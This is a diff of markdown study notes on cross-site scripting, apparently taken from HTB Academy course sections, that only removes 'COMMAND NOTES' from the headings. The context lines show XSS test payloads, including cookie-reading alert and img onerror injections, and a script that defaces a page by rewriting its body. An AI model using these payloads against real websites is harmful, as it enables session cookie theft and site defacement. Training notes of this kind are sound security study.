@@ -1,4 +1,4 @@
-# Intro to XSS — COMMAND NOTES
+# Intro to XSS 
 
 **Introduction**
 
@@ -9,7 +9,7 @@
 **Types of XSS**
 
 
-# Stored XSS — COMMAND NOTES
+# Stored XSS 
 
 **XSS Testing Payloads**
 
@@ -28,8 +28,7 @@ CTRL+U
 
 
 
-# Reflected XSS — COMMAND NOTES
-
+# Reflected XSS 
 **XSS Testing Payloads**
 
 <script>alert(window.origin)</script>
@@ -53,7 +52,7 @@ Copy>Copy URL
 <script>alert(document.cookie)</script>
 
 
-# DOM XSS — COMMAND NOTES
+# DOM XSS 
 
 **Developer Tools**  
 CTRL+Shift+I  
@@ -77,7 +76,7 @@ document.getElementById("todo").innerHTML
 <img src="" onerror=alert(document.cookie)>
 
 
-# XSS Discovery — COMMAND NOTES
+# XSS Discovery 
 
 **Automated Discovery Tools**  
 Nessus  
@@ -114,7 +113,7 @@ User-Agent
 [https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection)
 
 
-# Defacing — COMMAND NOTES
+# Defacing 
 
 **Defacement Elements**  
 document.body.style.background  
@@ -148,7 +147,7 @@ document.getElementsByTagName('body')[0].innerHTML = "New Text"
 <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
 
 
-# XSS Phishing — COMMAND NOTES
+# XSS Phishing 
 
 **Target Paths**  
 /phishing  
